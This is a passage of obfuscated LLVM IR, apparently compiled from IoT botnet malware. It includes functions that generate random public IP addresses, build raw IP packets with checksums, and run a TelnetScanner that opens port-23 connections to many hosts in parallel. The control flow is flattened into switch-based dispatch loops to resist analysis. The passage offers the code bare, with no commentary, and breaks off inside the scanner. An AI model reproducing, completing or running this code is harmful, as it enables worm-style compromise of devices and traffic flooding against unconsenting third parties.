  %169 = trunc i32 %168 to i8
  store i8 %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %170 = call i32 @rand() #5
  %171 = srem i32 %170, 255
  %172 = trunc i32 %171 to i8
  store i8 %172, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  store i32 414727712, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %174, i8 0, i64 16, i32 16, i1 false)
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %177 = zext i8 %176 to i32
  %178 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %179 = zext i8 %178 to i32
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %181 = zext i8 %180 to i32
  %182 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %183 = zext i8 %182 to i32
  %184 = call i32 (i8*, i8*, ...) @szprintf(i8* %175, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.263, i32 0, i32 0), i32 %177, i32 %179, i32 %181, i32 %183)
  %185 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %186 = call i32 @inet_addr(i8* %185) #5
  ret i32 %186

loopEnd:                                          ; preds = %160, %158, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -1596121236, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1596121236, label %6
    i32 -1897676068, label %10
    i32 271657013, label %19
    i32 299931083, label %23
    i32 321523206, label %30
    i32 1387542981, label %31
    i32 992190287, label %36
    i32 1876865494, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -1897676068, i32 271657013
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -1596121236, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 299931083, i32 321523206
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 321523206, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 1387542981, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 992190287, i32 1876865494
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 1387542981, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1965477897, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1965477897, label %first
    i32 816405316, label %7
    i32 1152019278, label %8
    i32 -1983113833, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 816405316, i32 1152019278
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1983113833, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -1983113833, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %.reg2mem190 = alloca i32
  %.reg2mem36 = alloca %struct.telstate_t*
  %.reg2mem34 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %30 = call i32 @getdtablesize() #5
  %31 = sub nsw i32 %30, 100
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  store i32 %32, i32* %.reg2mem
  %33 = load i32, i32* %4, align 4
  store i32 %33, i32* %.reg2mem34
  %switchVar = alloca i32
  store i32 -1961820194, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar33 = load i32, i32* %switchVar
  switch i32 %switchVar33, label %switchDefault [
    i32 -1961820194, label %first
    i32 1409836010, label %36
    i32 1632405397, label %38
    i32 1517676385, label %54
    i32 113850006, label %59
    i32 265729083, label %73
    i32 649723924, label %76
    i32 1346116779, label %77
    i32 -678610314, label %78
    i32 1427603878, label %79
    i32 1500418199, label %84
    i32 1633362661, label %92
    i32 2070234667, label %99
    i32 448212391, label %NodeBlock31
    i32 -1790093258, label %NodeBlock29
    i32 474086134, label %NodeBlock27
    i32 1059117965, label %NodeBlock25
    i32 -167194892, label %NodeBlock23
    i32 385168572, label %LeafBlock21
    i32 -1111279379, label %NodeBlock19
    i32 -1357025957, label %NodeBlock17
    i32 -1108543066, label %NodeBlock15
    i32 -832248401, label %NodeBlock13
    i32 -1154647788, label %NodeBlock11
    i32 -1866444097, label %NodeBlock9
    i32 1323638489, label %NodeBlock7
    i32 955682714, label %NodeBlock5
    i32 618070114, label %NodeBlock3
    i32 9241888, label %NodeBlock1
    i32 1674270055, label %NodeBlock
    i32 2045683805, label %LeafBlock
    i32 -887944323, label %124
    i32 785821625, label %133
    i32 574257811, label %153
    i32 -297178895, label %162
    i32 -1642960820, label %183
    i32 974140043, label %188
    i32 -921083237, label %197
    i32 -2008401222, label %202
    i32 -1066200633, label %203
    i32 1519751982, label %204
    i32 204752930, label %229
    i32 -214369966, label %230
    i32 -306146861, label %253
    i32 -11375539, label %258
    i32 -1352328780, label %262
    i32 -1158917165, label %266
    i32 -405946034, label %267
    i32 -1055218933, label %268
    i32 35184764, label %277
    i32 -77496829, label %278
    i32 -1572727654, label %312
    i32 -414576603, label %327
    i32 1327362191, label %331
    i32 633652167, label %348
    i32 90198340, label %349
    i32 -1984560745, label %353
    i32 1773870883, label %357
    i32 1933521241, label %358
    i32 413393032, label %369
    i32 1367191950, label %373
    i32 1125194645, label %374
    i32 77568242, label %389
    i32 -1572068152, label %404
    i32 950640803, label %408
    i32 1180739052, label %412
    i32 1261130615, label %413
    i32 -495101985, label %424
    i32 1192603993, label %428
    i32 327094014, label %429
    i32 159083318, label %446
    i32 98007736, label %450
    i32 -621158105, label %454
    i32 1323748249, label %469
    i32 -711778360, label %484
    i32 230017706, label %488
    i32 -1193296816, label %492
    i32 -1335928202, label %493
    i32 -1876379302, label %504
    i32 1933207500, label %508
    i32 -1334845598, label %509
    i32 230769834, label %526
    i32 -1668199314, label %530
    i32 1378450891, label %534
    i32 -1499061505, label %549
    i32 -1902766380, label %564
    i32 -915055145, label %568
    i32 1860841039, label %577
    i32 -826685558, label %586
    i32 1939990848, label %590
    i32 -1099549609, label %616
    i32 -369265523, label %617
    i32 -628357251, label %621
    i32 1577868841, label %622
    i32 242848236, label %623
    i32 -1084871230, label %634
    i32 -1154485213, label %638
    i32 1171358090, label %639
    i32 -897510935, label %648
    i32 1518758178, label %652
    i32 -518085090, label %656
    i32 1922010903, label %657
    i32 -417286665, label %661
    i32 1811307376, label %678
    i32 -1535013995, label %682
    i32 -1906410993, label %683
    i32 596278306, label %686
    i32 -1651511784, label %690
    i32 -1782660667, label %699
    i32 -307333693, label %703
    i32 2016524238, label %707
    i32 -618837526, label %722
    i32 1079757592, label %733
    i32 1373492016, label %737
    i32 1369066504, label %741
    i32 -109374924, label %742
    i32 1218982037, label %743
    i32 1450065268, label %752
    i32 1734995963, label %756
    i32 254252156, label %760
    i32 1237266614, label %775
    i32 1060946446, label %786
    i32 1187277607, label %790
    i32 374138529, label %801
    i32 63623951, label %805
    i32 -321661679, label %814
    i32 -665963004, label %818
    i32 69894592, label %822
    i32 1274397185, label %823
    i32 1135397183, label %824
    i32 426386325, label %825
    i32 1095161186, label %826
    i32 2003421001, label %864
    i32 1184162416, label %868
    i32 1485090962, label %872
    i32 1859029299, label %910
    i32 443681448, label %914
    i32 -812164194, label %918
    i32 1409175765, label %945
    i32 1299992131, label %949
    i32 1630869147, label %962
    i32 566977417, label %966
    i32 384889035, label %979
    i32 783797998, label %983
    i32 -1817392603, label %996
    i32 1891183815, label %1000
    i32 -216000045, label %1013
    i32 433103313, label %1017
    i32 -1326271790, label %1030
    i32 -1875638948, label %1034
    i32 2136347610, label %1047
    i32 -1398820981, label %1051
    i32 1364434448, label %1064
    i32 -51067289, label %1068
    i32 -999557027, label %1081
    i32 796383090, label %1085
    i32 1455729727, label %1098
    i32 861878202, label %1102
    i32 -1388518845, label %1115
    i32 -834825637, label %1119
    i32 -1618128519, label %1132
    i32 -1164917999, label %1136
    i32 -469698443, label %1149
    i32 -1368132898, label %1153
    i32 553269592, label %1168
    i32 -1257339028, label %1172
    i32 896060771, label %1199
    i32 -761167471, label %1200
    i32 -1098139706, label %1201
    i32 1789322532, label %1202
    i32 1955769108, label %1203
    i32 -907651884, label %1204
    i32 -868903328, label %1205
    i32 1886591571, label %1206
    i32 -8409751, label %1207
    i32 -985334739, label %1208
    i32 -1513817860, label %1209
    i32 -1332436228, label %1210
    i32 1531191070, label %1211
    i32 2049355519, label %1213
    i32 363268824, label %1216
    i32 -1326614734, label %1220
    i32 -1177065359, label %NewDefault
    i32 1726154473, label %1250
    i32 -232975211, label %1251
    i32 -1859244950, label %1254
    i32 -232689092, label %1255
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload35 = load volatile i32, i32* %.reg2mem34
  %34 = icmp sgt i32 %.reload, %.reload35
  %35 = select i1 %34, i32 1409836010, i32 1632405397
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  store i32 %37, i32* %5, align 4
  store i32 1632405397, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %39, align 4
  %40 = call zeroext i16 @htons(i16 zeroext 23) #10
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %43 = getelementptr inbounds [8 x i8], [8 x i8]* %42, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 8, i32 4, i1 false)
  %44 = call noalias i8* @malloc(i64 1025) #5
  store i8* %44, i8** %17, align 8
  %45 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1025, i32 1, i1 false)
  %46 = load i32, i32* %5, align 4
  %47 = zext i32 %46 to i64
  %48 = call i8* @llvm.stacksave()
  store i8* %48, i8** %19, align 8
  %49 = alloca %struct.telstate_t, i64 %47, align 16
  store %struct.telstate_t* %49, %struct.telstate_t** %.reg2mem36
  %.reload189 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %50 = bitcast %struct.telstate_t* %.reload189 to i8*
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 5
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  store i32 1517676385, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %6, align 4
  %56 = load i32, i32* %5, align 4
  %57 = icmp slt i32 %55, %56
  %58 = select i1 %57, i32 113850006, i32 649723924
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %6, align 4
  %61 = sext i32 %60 to i64
  %.reload188 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload188, i64 %61
  %63 = bitcast %struct.telstate_t* %62 to i8*
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 32, i32 16, i1 false)
  %64 = load i32, i32* %6, align 4
  %65 = sext i32 %64 to i64
  %.reload187 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload187, i64 %65
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %66, i32 0, i32 3
  store i8 1, i8* %67, align 1
  %68 = load i8*, i8** %17, align 8
  %69 = load i32, i32* %6, align 4
  %70 = sext i32 %69 to i64
  %.reload186 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload186, i64 %70
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %71, i32 0, i32 9
  store i8* %68, i8** %72, align 8
  store i32 265729083, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %6, align 4
  store i32 1517676385, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 1346116779, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -678610314, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 1427603878, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* %5, align 4
  %82 = icmp slt i32 %80, %81
  %83 = select i1 %82, i32 1500418199, i32 -1859244950
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %6, align 4
  %86 = sext i32 %85 to i64
  %.reload185 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload185, i64 %86
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %87, i32 0, i32 7
  %89 = load i32, i32* %88, align 16
  %90 = icmp eq i32 %89, 0
  %91 = select i1 %90, i32 1633362661, i32 2070234667
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = call i64 @time(i64* null) #5
  %94 = trunc i64 %93 to i32
  %95 = load i32, i32* %6, align 4
  %96 = sext i32 %95 to i64
  %.reload184 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload184, i64 %96
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %97, i32 0, i32 7
  store i32 %94, i32* %98, align 16
  store i32 2070234667, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %.reload183 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload183, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 2
  %104 = load i8, i8* %103, align 8
  %105 = zext i8 %104 to i32
  store i32 %105, i32* %.reg2mem190
  store i32 448212391, i32* %switchVar
  br label %loopEnd

NodeBlock31:                                      ; preds = %loopEntry
  %.reload208 = load volatile i32, i32* %.reg2mem190
  %Pivot32 = icmp slt i32 %.reload208, 8
  %106 = select i1 %Pivot32, i32 -1154647788, i32 -1790093258
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock29:                                      ; preds = %loopEntry
  %.reload199 = load volatile i32, i32* %.reg2mem190
  %Pivot30 = icmp slt i32 %.reload199, 12
  %107 = select i1 %Pivot30, i32 -1357025957, i32 474086134
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock27:                                      ; preds = %loopEntry
  %.reload195 = load volatile i32, i32* %.reg2mem190
  %Pivot28 = icmp slt i32 %.reload195, 14
  %108 = select i1 %Pivot28, i32 -1111279379, i32 1059117965
  store i32 %108, i32* %switchVar
  br label %loopEnd

NodeBlock25:                                      ; preds = %loopEntry
  %.reload193 = load volatile i32, i32* %.reg2mem190
  %Pivot26 = icmp slt i32 %.reload193, 15
  %109 = select i1 %Pivot26, i32 1485090962, i32 -167194892
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock23:                                      ; preds = %loopEntry
  %.reload192 = load volatile i32, i32* %.reg2mem190
  %Pivot24 = icmp slt i32 %.reload192, 16
  %110 = select i1 %Pivot24, i32 -812164194, i32 385168572
  store i32 %110, i32* %switchVar
  br label %loopEnd

LeafBlock21:                                      ; preds = %loopEntry
  %.reload191 = load volatile i32, i32* %.reg2mem190
  %SwitchLeaf22 = icmp eq i32 %.reload191, 16
  %111 = select i1 %SwitchLeaf22, i32 -1326614734, i32 -1177065359
  store i32 %111, i32* %switchVar
  br label %loopEnd

NodeBlock19:                                      ; preds = %loopEntry
  %.reload194 = load volatile i32, i32* %.reg2mem190
  %Pivot20 = icmp slt i32 %.reload194, 13
  %112 = select i1 %Pivot20, i32 254252156, i32 1095161186
  store i32 %112, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload198 = load volatile i32, i32* %.reg2mem190
  %Pivot18 = icmp slt i32 %.reload198, 10
  %113 = select i1 %Pivot18, i32 -832248401, i32 -1108543066
  store i32 %113, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload196 = load volatile i32, i32* %.reg2mem190
  %Pivot16 = icmp slt i32 %.reload196, 11
  %114 = select i1 %Pivot16, i32 2016524238, i32 1218982037
  store i32 %114, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload197 = load volatile i32, i32* %.reg2mem190
  %Pivot14 = icmp slt i32 %.reload197, 9
  %115 = select i1 %Pivot14, i32 -518085090, i32 -1651511784
  store i32 %115, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload207 = load volatile i32, i32* %.reg2mem190
  %Pivot12 = icmp slt i32 %.reload207, 4
  %116 = select i1 %Pivot12, i32 618070114, i32 -1866444097
  store i32 %116, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload202 = load volatile i32, i32* %.reg2mem190
  %Pivot10 = icmp slt i32 %.reload202, 6
  %117 = select i1 %Pivot10, i32 955682714, i32 1323638489
  store i32 %117, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
